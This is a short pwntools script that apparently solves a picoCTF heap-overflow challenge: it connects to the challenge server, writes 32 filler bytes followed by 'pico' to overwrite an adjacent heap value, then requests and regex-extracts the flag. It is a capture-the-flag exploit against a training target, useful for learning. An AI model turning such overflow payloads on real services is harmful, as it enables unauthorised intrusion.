from pwn import *
import re

# Connect
r = remote('tethys.picoctf.net', 64151)

# Option 2: Write to buffer
r.recvuntil(b'choice:')
r.sendline(b'2')
r.recvuntil(b'data on the heap:\n')  # or whatever the prompt is
r.send(b'1' * 32 + b'pico\n')

# Option 4: Print Flag
r.recvuntil(b'choice:')
r.sendline(b'4')

# Get response
sol = r.recvall(timeout=3)

# Extract flag
flag = re.search(r'picoCTF{[^}]*}', sol.decode())
if flag:
    print("Found flag:", flag.group(0))
else:
    print("No flag found.")

